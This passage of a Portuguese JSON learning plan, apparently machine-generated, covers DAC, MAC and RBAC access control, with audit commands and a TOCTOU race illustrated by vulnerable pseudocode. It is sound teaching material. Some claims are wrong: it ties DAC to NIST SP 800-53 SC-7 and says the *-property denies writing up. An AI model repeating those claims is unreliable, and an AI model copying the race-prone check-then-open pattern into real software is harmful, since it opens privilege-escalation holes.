                                    "Pesquise exemplos básicos em sistemas como Unix/Linux (chmod)."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando sujeito, objeto e ACL com permissões concedidas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-53 sobre SC-07",
                                    "Notas de aula sobre SO",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Use analogias cotidianas, como dono de uma casa decidindo quem entra em cada cômodo.",
                                  "learningObjective": "Compreender os pilares do DAC para basear análise de prós e contras.",
                                  "commonMistakes": [
                                    "Confundir DAC com MAC",
                                    "Ignorar papel do proprietário",
                                    "Não diferenciar ACL de permissões globais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Explicar Vantagens do DAC",
                                  "subSteps": [
                                    "Liste vantagens principais: flexibilidade para proprietários, simplicidade de implementação, adequação para ambientes colaborativos.",
                                    "Explique flexibilidade: proprietários concedem/revogam acessos dinamicamente sem admin central.",
                                    "Discuta simplicidade: usa ACLs familiares em SOs como Windows NTFS ou Linux.",
                                    "Forneça exemplo: desenvolvedor compartilhando código com equipe sem burocracia.",
                                    "Avalie cenários onde DAC brilha, como equipes ágeis."
                                  ],
                                  "verification": "Escreva uma lista de pelo menos 4 vantagens com uma frase explicativa cada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de ACL em man pages Unix",
                                    "Artigos sobre DAC vs outros modelos",
                                    "Planilha para listar prós"
                                  ],
                                  "tips": "Priorize vantagens práticas; pense em usabilidade diária.",
                                  "learningObjective": "Dominar argumentos pró-DAC focados em eficiência e autonomia.",
                                  "commonMistakes": [
                                    "Superestimar flexibilidade ignorando overhead de gerenciamento",
                                    "Listar vantagens genéricas sem contexto DAC",
                                    "Confundir com benefícios de RBAC"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Desvantagens e Riscos do DAC",
                                  "subSteps": [
                                    "Liste desvantagens: risco de concessão excessiva, escalada de privilégios por erros humanos, inconsistências em ACLs.",
                                    "Explique riscos: proprietário inexperiente dá 'full access' levando a vazamentos.",
                                    "Discuta escalada: usuário ganha perms em arquivo, explora para privilégios maiores.",
                                    "Cite exemplos: insider threats ou ataques via misconfigurations em compartilhamentos.",
                                    "Compare com MAC para destacar falta de enforcement centralizado."
                                  ],
                                  "verification": "Desenvolva 4 desvantagens com cenários de risco hipotéticos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Relatórios de breaches como Equifax (misconfigs)",
                                    "Ferramentas como ACL viewers em Linux",
                                    "Casos de estudo NIST"
                                  ],
                                  "tips": "Foque em falhas humanas; use 'princípio do menor privilégio' como contraponto.",
                                  "learningObjective": "Identificar vulnerabilidades inerentes ao DAC para avaliação crítica.",
                                  "commonMistakes": [
                                    "Minimizar riscos humanos",
                                    "Listar desvantagens de SOs não do modelo DAC",
                                    "Ignorar propagação de erros em herança de perms"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Vantagens e Desvantagens em uma Lista Balanceada",
                                  "subSteps": [
                                    "Compile listas paralelas: 4-5 prós vs contras em tabela.",
                                    "Discuta trade-offs: flexibilidade vs segurança em contextos específicos.",
                                    "Crie resumo: quando usar DAC (ex: dev teams) vs evitar (dados sensíveis).",
                                    "Teste lista com perguntas: 'Essa vantagem é exclusiva do DAC?'",
                                    "Prepare para discussão: implicações para políticas de SO."
                                  ],
                                  "verification": "Gere uma tabela Markdown com prós, contras e mitigações.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramenta de tabela como Google Sheets",
                                    "Notas dos steps anteriores"
                                  ],
                                  "tips": "Mantenha balanceado; inclua mitigações como auditing.",
                                  "learningObjective": "Consolidar conhecimento em formato acionável e comparativo.",
                                  "commonMistakes": [
                                    "Listas desbalanceadas",
                                    "Falta de exemplos concretos",
                                    "Não ligar a riscos reais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux compartilhado por uma equipe de desenvolvimento, o proprietário de um diretório de código-fonte usa chmod para dar leitura/escrita a colegas (vantagem: colaboração rápida). Porém, acidentalmente concede execução a todos, permitindo escalada de privilégios via script malicioso (desvantagem: erro humano leva a breach).",
                              "finalVerifications": [
                                "Pode listar pelo menos 4 vantagens precisas do DAC com explicações.",
                                "Identifica 4 desvantagens chave, incluindo riscos de escalada.",
                                "Explica trade-off flexibilidade vs segurança com exemplo.",
                                "Compara DAC com MAC em 2 pontos relevantes.",
                                "Gera tabela balanceada de prós/contras.",
                                "Sugere mitigações para desvantagens como training e auditing."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições e componentes corretos (30%)",
                                "Completude das listas: cobertura equilibrada de prós/contras (25%)",
                                "Profundidade de análise: exemplos e riscos reais (20%)",
                                "Clareza na síntese: tabela ou lista organizada (15%)",
                                "Conexão com contexto: link a SO e cibersegurança (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Implementação prática de ACLs em Unix/Windows.",
                                "Gestão de Riscos: Análise de threats em políticas de acesso.",
                                "Ética e Direito: Responsabilidades de proprietários em concessão de acessos.",
                                "Desenvolvimento de Software: Colaboração segura em repositórios."
                              ],
                              "realWorldApplication": "Em empresas como Google ou startups de tech, DAC é usado em sistemas de arquivos para equipes dev compartilharem código, mas com ferramentas como SELinux para mitigar riscos, evitando breaches por misconfigs que custam milhões em perdas de dados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.3.2",
                            "name": "Comparar DAC com MAC e RBAC",
                            "description": "Contrastar DAC (discrecional, proprietário decide) com MAC (centralizado, obrigatório) e RBAC (baseado em papéis), usando cenários de segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as definições e características principais de DAC, MAC e RBAC",
                                  "subSteps": [
                                    "Ler definições oficiais: DAC (controle discrecional, proprietário decide acessos), MAC (controle obrigatório, centralizado por política de segurança) e RBAC (baseado em papéis/roles atribuídos aos usuários).",
                                    "Identificar características chave: DAC é flexível mas arriscado; MAC é rígido e seguro; RBAC é escalável para organizações.",
                                    "Anotar exemplos iniciais de cada: DAC em arquivos Windows NTFS, MAC em sistemas militares, RBAC em Active Directory.",
                                    "Criar um glossário pessoal com termos como 'proprietário', 'label de segurança' e 'permissões de role'.",
                                    "Revisar diferenças básicas em um fluxograma simples."
                                  ],
                                  "verification": "Criar um resumo de 1 parágrafo por modelo, confirmando com fontes confiáveis como NIST SP 800-53.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-53",
                                    "Vídeos sobre controles de acesso no YouTube/Khan Academy",
                                    "Bloco de notas ou ferramenta como Notion"
                                  ],
                                  "tips": "Comece pelas definições puras antes de exemplos para evitar confusões iniciais.",
                                  "learningObjective": "Definir com precisão DAC, MAC e RBAC, incluindo suas características fundamentais.",
                                  "commonMistakes": [
                                    "Confundir DAC (flexível) com MAC (rígido)",
                                    "Ignorar o papel central da autoridade em MAC",
                                    "Pensar RBAC como puramente hierárquico sem roles"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar vantagens, limitações e cenários típicos de cada modelo",
                                  "subSteps": [
                                    "Listar 3 vantagens e 3 limitações por modelo: ex. DAC (vantagem: simplicidade; limitação: insider threats).",
                                    "Associar cenários: DAC para ambientes colaborativos, MAC para dados classificados, RBAC para empresas grandes.",
                                    "Pesquisar casos reais: SELinux para MAC, NTFS para DAC, Azure AD para RBAC.",
                                    "Categorizar por nível de segurança: baixa (DAC), alta (MAC), média/escalável (RBAC).",
                                    "Discutir trade-offs: flexibilidade vs. segurança."
                                  ],
                                  "verification": "Preencher uma tabela com vantagens/limitações e cenários para cada modelo.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Tabela em Excel/Google Sheets",
                                    "Artigos da OWASP ou CISSP guides",
                                    "Exemplos de SO como Linux/Windows"
                                  ],
                                  "tips": "Use bullet points para listar, facilitando comparação visual posterior.",
                                  "learningObjective": "Identificar prós, contras e usos adequados de cada modelo de controle de acesso.",
                                  "commonMistakes": [
                                    "Superestimar segurança do DAC em ambientes sensíveis",
                                    "Subestimar complexidade administrativa do MAC",
                                    "Confundir RBAC com ACLs simples"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Contrastar os modelos usando cenários de segurança comparativos",
                                  "subSteps": [
                                    "Criar 3 cenários hipotéticos: ex. acesso a arquivo confidencial em empresa, hospital e governo.",
                                    "Simular decisão de acesso em cada cenário para DAC, MAC e RBAC.",
                                    "Destacar diferenças: quem decide (proprietário vs. sistema vs. admin de roles).",
                                    "Analisar riscos: propagação de erros no DAC, rigidez no MAC, má gestão de roles no RBAC.",
                                    "Debater qual modelo é melhor por cenário e por quê."
                                  ],
                                  "verification": "Escrever uma comparação narrativa de 200 palavras para um cenário escolhido.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Cenários impressos ou digitais",
                                    "Referências de breaches reais como Equifax"
                                  ],
                                  "tips": "Escolha cenários familiares para tornar a comparação mais intuitiva e memorável.",
                                  "learningObjective": "Aplicar os modelos em cenários reais, destacando contrastes práticos.",
                                  "commonMistakes": [
                                    "Aplicar DAC em cenários de alta segurança",
                                    "Ignorar escalabilidade do RBAC em grandes orgs",
                                    "Não considerar herança de permissões em RBAC"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar a comparação em uma tabela ou diagrama final e revisar",
                                  "subSteps": [
                                    "Construir tabela comparativa: colunas para DAC/MAC/RBAC, linhas para definição, vantagens, limitações, cenários.",
                                    "Criar diagrama Venn ou matriz de decisão para visualização.",
                                    "Revisar com auto-perguntas: 'Em que situações DAC falha onde MAC succeeds?'",
                                    "Testar conhecimento respondendo quizzes online sobre controles de acesso.",
                                    "Preparar resumo executivo de 1 página."
                                  ],
                                  "verification": "Compartilhar tabela/diagrama com um par ou fórum para feedback.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Google Sheets ou Lucidchart",
                                    "Quizzes CISSP gratuitos online",
                                    "Modelo de tabela pronta"
                                  ],
                                  "tips": "Mantenha a tabela concisa: máximo 5 linhas por categoria para foco.",
                                  "learningObjective": "Consolidar conhecimentos em formato comparativo acionável e visual.",
                                  "commonMistakes": [
                                    "Tabelas desbalanceadas (mais detalhes em um modelo)",
                                    "Omitir cenários híbridos reais",
                                    "Não revisar com fontes externas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa de saúde, um arquivo de prontuários: No DAC, o médico proprietário concede acesso; no MAC, labels de 'confidencial' são verificados pelo SO; no RBAC, enfermeiros têm role 'leitura' pré-definido, evitando erros humanos e garantindo conformidade HIPAA.",
                              "finalVerifications": [
                                "Explicar verbalmente as 3 diferenças principais entre DAC, MAC e RBAC.",
                                "Preencher corretamente uma tabela de comparação sem consultar notas.",
                                "Identificar o modelo inadequado para um cenário de alta segurança (ex: militar).",
                                "Discutir um risco específico de cada modelo.",
                                "Aplicar RBAC a um exemplo organizacional simples.",
                                "Comparar overhead administrativo: DAC baixo, MAC alto, RBAC médio."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições (90% correto).",
                                "Profundidade na análise de vantagens/limitações (cobertura de pelo menos 3 por modelo).",
                                "Relevância e realismo dos cenários comparativos.",
                                "Clareza na tabela/diagrama de síntese.",
                                "Capacidade de justificar escolhas de modelo por contexto.",
                                "Identificação correta de erros comuns e mitigações."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Recursos Humanos: RBAC alinha com atribuição de papéis organizacionais.",
                                "Direito e Compliance: MAC relaciona-se a regulamentações como LGPD/GDPR.",
                                "Administração de Sistemas: Integração com SO como Windows/Linux.",
                                "Análise de Riscos: Conexão com frameworks como NIST RMF.",
                                "Design de Software: Implementação em apps com OAuth/JWT roles."
                              ],
                              "realWorldApplication": "Em bancos como Itaú ou governos federais, RBAC gerencia acessos em massa; MAC em infra crítica como energia (ex: SELinux no Brasil); DAC em equipes ágeis de dev, com migração para RBAC para escalar segurança sem perder produtividade."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.3.3",
                            "name": "Identificar ataques comuns ao DAC",
                            "description": "Analisar vulnerabilidades como TOCTOU (Time-of-Check to Time-of-Use) e propagação de permissões em ambientes multiusuário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do DAC e Vulnerabilidades Gerais",
                                  "subSteps": [
                                    "Estude a definição de Controle de Acesso Discrecional (DAC), onde proprietários de objetos definem permissões.",
                                    "Revise componentes chave: subjects (usuários/processos), objects (arquivos/recursos) e access control lists (ACLs).",
                                    "Identifique vulnerabilidades inerentes ao DAC, como dependência em confiança do proprietário e falta de controle centralizado.",
                                    "Analise exemplos básicos de falhas em sistemas como Unix/Linux (chmod, chown).",
                                    "Compare com MAC para destacar por que DAC é suscetível a ataques locais."
                                  ],
                                  "verification": "Resuma em 3 frases os princípios do DAC e liste 2 vulnerabilidades gerais; valide com um colega ou autoavaliação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do POSIX sobre DAC",
                                    "Capítulo de livro sobre SO: 'Operating System Concepts' seção de proteção",
                                    "Vídeo tutorial sobre permissões Unix no YouTube"
                                  ],
                                  "tips": "Use diagramas para visualizar subjects, objects e ACLs para melhor retenção.",
                                  "learningObjective": "Entender os pilares do DAC e por que ele é vulnerável a manipulações locais.",
                                  "commonMistakes": "Confundir DAC com MAC; ignorar o papel do proprietário na concessão de permissões."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Ataque TOCTOU (Time-of-Check to Time-of-Use)",
                                  "subSteps": [
                                    "Defina TOCTOU: discrepância temporal entre verificação de permissão e uso do recurso.",
                                    "Estude cenários clássicos: verificação de existência/permissão de arquivo seguida de abertura.",
                                    "Simule em pseudocódigo: if (access(file, R_OK)) { open(file); } destacando race condition.",
                                    "Explore exploits reais em sistemas como NFS ou compartilhamentos Windows.",
                                    "Discuta mitigações: atomicidade via open() com flags ou file locks."
                                  ],
                                  "verification": "Escreva um exemplo de código vulnerável a TOCTOU e proponha uma correção; teste conceitualmente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Artigo 'TOCTOU Races in Linux' de MITRE",
                                    "Ferramenta de simulação como strace para rastrear syscalls",
                                    "Exemplos de código em C no GitHub sobre race conditions"
                                  ],
                                  "tips": "Pense em multithreading: use ferramentas como ThreadSanitizer para detectar races em prática.",
                                  "learningObjective": "Identificar e explicar o mecanismo de TOCTOU com exemplos acionáveis.",
                                  "commonMistakes": "Subestimar o impacto em ambientes single-threaded; confundir com outros timing attacks."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Propagação de Permissões em Ambientes Multiusuário",
                                  "subSteps": [
                                    "Explique propagação: permissões herdadas via grupos ou ACLs que se espalham indesejadamente.",
                                    "Analise ataques: usuário A concede permissão a B, que abusa para acessar dados de C.",
                                    "Estude casos em Unix: setuid bits levando a escalada via programas maliciosos.",
                                    "Revise exemplos: Trojan horses em diretórios compartilhados ou world-writable files.",
                                    "Discuta defesas: princípios de least privilege e auditoria de permissões."
                                  ],
                                  "verification": "Crie um diagrama de fluxo mostrando como uma permissão se propaga e causa breach; valide lógica.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Man pages: chmod, chown, setuid",
                                    "Relatórios CWE-276: Incorrect Default Permissions",
                                    "Ferramenta find para auditar permissões em Linux"
                                  ],
                                  "tips": "Execute 'find / -perm -4000' para listar setuid binaries e analisar riscos reais.",
                                  "learningObjective": "Mapear como permissões se propagam e levam a acessos não autorizados.",
                                  "commonMistakes": "Ignorar herança de grupos; achar que chown resolve propagação automática."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar e Sintetizar Ataques Comuns ao DAC",
                                  "subSteps": [
                                    "Liste outros ataques: confusão de nomes (symlinks), Trojan horses, escalada via SUID.",
                                    "Crie matriz comparativa: ataque, mecanismo, exemplo, mitigação.",
                                    "Simule detecção: use logs de auditoria para identificar padrões de abuso.",
                                    "Avalie impactos em cenários multiusuário: servidores compartilhados vs. desktops.",
                                    "Planeje defesas holísticas: combinar DAC com RBAC/MAC."
                                  ],
                                  "verification": "Produza um relatório de 1 página listando 5 ataques com descrições; peer-review.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "CVE database filtrado por DAC exploits",
                                    "Ferramenta auditd no Linux",
                                    "Checklist OWASP para access control"
                                  ],
                                  "tips": "Priorize ataques de alta frequência em CVEs para relevância prática.",
                                  "learningObjective": "Sintetizar ataques comuns e desenvolver skills de identificação proativa.",
                                  "commonMistakes": "Focar só em TOCTOU; negligenciar ataques sociais como engenharia de permissões."
                                }
                              ],
                              "practicalExample": "Em um servidor Linux compartilhado, um desenvolvedor verifica se um script tem permissão de leitura (stat()), mas antes de executá-lo, um atacante substitui o arquivo via symlink. Isso explora TOCTOU, permitindo execução de código malicioso com privilégios do dev. Propagação ocorre se o dev roda como setgid, afetando todo o grupo.",
                              "finalVerifications": [
                                "Explicar TOCTOU com um exemplo de código vulnerável e fixado.",
                                "Desenhar diagrama de propagação de permissões em ambiente multiusuário.",
                                "Listar 3 ataques adicionais ao DAC com CVEs reais.",
                                "Identificar mitigações para cada ataque principal.",
                                "Simular detecção de um ataque via comandos de auditoria.",
                                "Comparar DAC vs. outros modelos em suscetibilidade a esses ataques."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições corretas de TOCTOU e propagação (30%)",
                                "Profundidade de análise: exemplos concretos e diagramas (25%)",
                                "Capacidade de identificação: lista completa de ataques (20%)",
                                "Propostas de mitigação: viáveis e específicas (15%)",
                                "Clareza de comunicação: relatórios/diagramas legíveis (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Race conditions em threads (ex: pthreads em C)",
                                "Redes: Vulnerabilidades em compartilhamentos NFS/SMB",
                                "Auditoria e Forense: Análise de logs com ferramentas como Splunk",
                                "Gestão de Sistemas: Políticas de least privilege em DevOps"
                              ],
                              "realWorldApplication": "Em data centers empresariais (ex: AWS EC2 com Linux), admins usam isso para auditar permissões e prevenir breaches como o Capital One (exploração de IAM mal configurado similar a DAC). Também essencial para compliance NIST 800-53 SC-7."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.3.4",
                            "name": "Aplicar boas práticas de configuração DAC",
                            "description": "Recomendar princípios como princípio do menor privilégio e auditoria de permissões para mitigar riscos no DAC.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Princípios Fundamentais de Boas Práticas em DAC",
                                  "subSteps": [
                                    "Estude o princípio do menor privilégio (least privilege): conceda apenas as permissões necessárias para a tarefa.",
                                    "Aprenda o princípio de need-to-know: acesso apenas a informações relevantes para o papel do usuário.",
                                    "Revise conceitos de separação de deveres (separation of duties) para evitar concentrações de poder.",
                                    "Analise exemplos de riscos em DAC, como escalada de privilégios por permissões excessivas.",
                                    "Documente os princípios em um resumo pessoal."
                                  ],
                                  "verification": "Criar um mapa mental ou tabela resumindo os 3 princípios principais e seus benefícios em DAC.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação oficial de DAC (man pages do Linux chmod/chown, Windows icacls), artigos sobre least privilege (ex: NIST SP 800-53).",
                                  "tips": "Use analogias reais, como chaves de portas em um prédio, para fixar os conceitos.",
                                  "learningObjective": "Identificar e explicar os princípios chave para configuração segura de DAC.",
                                  "commonMistakes": "Confundir least privilege com no privilege; ignorar contextos dinâmicos de acesso."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar e Auditar Permissões Existentes em um Sistema DAC",
                                  "subSteps": [
                                    "Liste usuários, grupos e recursos (arquivos/diretórios) em um ambiente de teste.",
                                    "Use comandos como 'ls -l' (Linux) ou 'icacls' (Windows) para inspecionar permissões atuais.",
                                    "Identifique permissões excessivas ou desnecessárias violando least privilege.",
                                    "Registre violações em um relatório de auditoria inicial.",
                                    "Priorize riscos altos, como root/admin com acesso total desnecessário."
                                  ],
                                  "verification": "Gerar um relatório de auditoria listando pelo menos 5 permissões problemáticas e justificativas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Máquina virtual Linux/Windows com DAC ativado, ferramentas como ls, find, icacls.",
                                  "tips": "Automatize com scripts simples (ex: find /dir -perm -777) para auditorias rápidas.",
                                  "learningObjective": "Realizar uma auditoria completa de permissões para detectar riscos em DAC.",
                                  "commonMistakes": "Auditar apenas arquivos visíveis; esquecer permissões herdadas em subdiretórios."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Permissões Seguras Seguindo Least Privilege",
                                  "subSteps": [
                                    "Defina papéis de usuários e mapeie permissões mínimas necessárias (ex: read-only para viewers).",
                                    "Aplique permissões com comandos: chmod 640 arquivo (owner rw, group r, others none).",
                                    "Crie grupos para separation of duties e atribua usuários adequadamente.",
                                    "Teste acessos: tente ações permitidas/não permitidas para validar.",
                                    "Salve configurações em um baseline documentado."
                                  ],
                                  "verification": "Demonstrar que usuários podem executar apenas tarefas permitidas, sem acessos extras.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ambiente de teste com usuários/grupos simulados, editores de texto para documentação.",
                                  "tips": "Sempre teste em ambiente isolado antes de produção; use ummasks para padrões seguros.",
                                  "learningObjective": "Implementar configurações de DAC alinhadas ao menor privilégio.",
                                  "commonMistakes": "Conceder permissões de grupo amplas demais; não revogar permissões antigas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Auditoria Contínua e Revisão de Permissões",
                                  "subSteps": [
                                    "Configure logs de auditoria (ex: auditd no Linux para acessos falhos/sucessos).",
                                    "Agende revisões periódicas (ex: script semanal para checar mudanças).",
                                    "Defina alertas para violações (ex: permissões 777 detectadas).",
                                    "Treine usuários sobre relatar acessos suspeitos.",
                                    "Atualize o relatório inicial com métricas de conformidade."
                                  ],
                                  "verification": "Executar uma simulação de auditoria e gerar log com eventos monitorados.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramentas de auditoria (auditd, Windows Event Viewer), cron jobs para agendamento.",
                                  "tips": "Integre com SIEM simples como ELK stack para visualização de logs.",
                                  "learningObjective": "Estabelecer mecanismos de monitoramento para manter DAC seguro ao longo do tempo.",
                                  "commonMistakes": "Configurar auditoria sem filtros, gerando logs excessivos; ignorar revisões manuais."
                                }
                              ],
                              "practicalExample": "Em um servidor Linux compartilhado de uma empresa, configure um diretório /dados/confidencial: chown grupo-equipe:dados, chmod 750 /dados/confidencial, adicione auditd para monitorar acessos. Teste: usuário da equipe lê/escreve, outsider é negado, log registra tentativas.",
                              "finalVerifications": [
                                "Todas permissões seguem least privilege sem excessos identificados.",
                                "Auditoria registra acessos e violações em logs acessíveis.",
                                "Testes de acesso confirmam negações corretas para não autorizados.",
                                "Relatório de baseline documenta configurações e revisões planejadas.",
                                "Nenhum erro comum (ex: 777) presente após configuração.",
                                "Simulação de risco (ex: escalada) é mitigada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na aplicação de least privilege (90% das permissões otimizadas).",
                                "Completude da auditoria (cobertura de todos recursos chave).",
                                "Funcionalidade dos logs e alertas configurados.",
                                "Documentação clara e acionável do processo.",
                                "Habilidade em identificar e corrigir 5+ violações simuladas.",
                                "Tempo de configuração dentro do estimado com zero falhas críticas."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Identidades e Acesso (IAM): Integração com autenticação.",
                                "Conformidade e Governança: Alinhamento com GDPR/ISO 27001.",
                                "Redes e Sistemas: Comparação com MAC em firewalls.",
                                "Desenvolvimento de Software: Controle de acesso em apps (RBAC).",
                                "Análise de Riscos: Modelos como STRIDE para ameaças DAC."
                              ],
                              "realWorldApplication": "Em organizações como bancos ou hospitais, configurações DAC seguras protegem dados sensíveis (ex: registros médicos), previnem vazamentos via insider threats e atendem auditorias regulatórias, reduzindo multas e breaches."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.5",
                    "name": "Controle de Acesso Mandatório (MAC)",
                    "description": "Modelo baseado em rótulos de segurança e políticas centrais para controle de acesso.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.5.1",
                        "name": "Rótulos de Segurança em MAC",
                        "description": "Compreensão dos rótulos de segurança atribuídos a sujeitos (processos, usuários) e objetos (arquivos, recursos) para definir níveis hierárquicos e categorias de acesso, diferenciando MAC de DAC.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.1.1",
                            "name": "Identificar sujeitos e objetos em sistemas MAC",
                            "description": "Diferenciar sujeitos (entidades ativas como processos e usuários) de objetos (entidades passivas como arquivos e memória) e explicar como rótulos são atribuídos para controle centralizado de acesso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Sujeitos e Objetos em MAC",
                                  "subSteps": [
                                    "Defina 'sujeito' como uma entidade ativa, como um processo, usuário ou thread que inicia ações de acesso.",
                                    "Defina 'objeto' como uma entidade passiva, como arquivos, memória, sockets ou dispositivos que são alvos de acesso.",
                                    "Compare sujeitos e objetos usando uma tabela: colunas para características (ativa/passiva, exemplos, papel no acesso).",
                                    "Estude a diferença com DAC (Discretionary Access Control), onde proprietários decidem, vs. MAC centralizado.",
                                    "Revise exemplos: um processo lendo um arquivo (processo = sujeito, arquivo = objeto)."
                                  ],
                                  "verification": "Crie uma tabela comparativa com pelo menos 5 exemplos de cada e explique verbalmente ou por escrito.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação de MAC (ex: NIST SP 800-53), diagrama de sujeitos/objetos"
                                  ],
                                  "tips": "Use mnemônicos: 'Sujeitos São Ativos' (SSA) para lembrar sujeitos como ativos.",
                                  "learningObjective": "Diferenciar precisamente sujeitos de objetos com base em suas propriedades intrínsecas.",
                                  "commonMistakes": [
                                    "Confundir usuários com objetos (usuários são sujeitos quando ativos)",
                                    "Ignorar que processos filhos herdam rótulos de sujeitos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Rótulos de Segurança e Sua Atribuição",
                                  "subSteps": [
                                    "Aprenda que rótulos incluem níveis de sensibilidade (ex: Unclassified, Secret, Top Secret) e categorias (ex: NOFORN).",
                                    "Entenda como rótulos são atribuídos centralmente por políticas de segurança, não por usuários.",
                                    "Estude regras: sujeito só acessa objeto se rótulo do sujeito domina o do objeto (regra de leitura simples).",
                                    "Analise herança: processos herdam rótulos dos pais; objetos fixos têm rótulos estáticos.",
                                    "Pratique diagramando fluxo: Sujeito (rótulo Secret) tenta ler Objeto (Unclassified)."
                                  ],
                                  "verification": "Desenhe um fluxograma de atribuição de rótulos para 3 cenários diferentes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Guia SELinux ou FreeBSD MAC, exemplos de políticas Bell-LaPadula"
                                  ],
                                  "tips": "Lembre: rótulos são como 'etiquetas de classificação' em documentos militares.",
                                  "learningObjective": "Explicar como rótulos são atribuídos e usados para controle centralizado.",
                                  "commonMistakes": [
                                    "Achar que usuários atribuem rótulos (é centralizado)",
                                    "Confundir domínio de leitura com escrita"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Sujeitos e Objetos em Cenários Práticos",
                                  "subSteps": [
                                    "Analise logs de sistema: identifique sujeitos (PIDs de processos) e objetos (caminhos de arquivos).",
                                    "Simule em ambiente virtual: use comandos como 'ps' para processos e 'ls -Z' em SELinux para rótulos.",
                                    "Classifique 10 exemplos mistos: usuário logado, socket de rede, página de memória.",
                                    "Crie um quiz autoavaliativo com 5 perguntas de identificação.",
                                    "Discuta exceções: como pipes ou shared memory atuam como ambos em contextos."
                                  ],
                                  "verification": "Resolva um conjunto de 10 exercícios de identificação com 100% de acerto.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "VM com SELinux/AppArmor instalada, logs de auditd"
                                  ],
                                  "tips": "Procure por 'quem inicia' (sujeito) vs. 'o quê é acessado' (objeto).",
                                  "learningObjective": "Identificar corretamente sujeitos e objetos em logs e cenários reais.",
                                  "commonMistakes": [
                                    "Classificar arquivos em execução como sujeitos (são objetos até processados)",
                                    "Ignorar contexto multi-thread"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conhecimento em Controle de Acesso MAC",
                                  "subSteps": [
                                    "Simule violações: sujeito Secret tentando escrever em Top Secret (negado pela *-property).",
                                    "Configure uma política simples em lab: defina rótulos e teste acessos.",
                                    "Explique impacto de downgrade/upgrade de rótulos em sujeitos/objetos.",
                                    "Analise caso de estudo: brecha em MAC por má identificação de sujeito.",
                                    "Resuma regras Biba ou Clark-Wilson como extensões."
                                  ],
                                  "verification": "Configure e teste uma política MAC em VM, documentando sucessos/falhas.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "VM Linux com SELinux habilitado, política de exemplo .te file"
                                  ],
                                  "tips": "Teste incrementalmente: comece com leitura simples.",
                                  "learningObjective": "Demonstrar como identificação afeta decisões de acesso em MAC.",
                                  "commonMistakes": [
                                    "Esquecer herança de rótulos em forks de processos",
                                    "Aplicar regras DAC em MAC"
                                  ]
                                }
                              ],
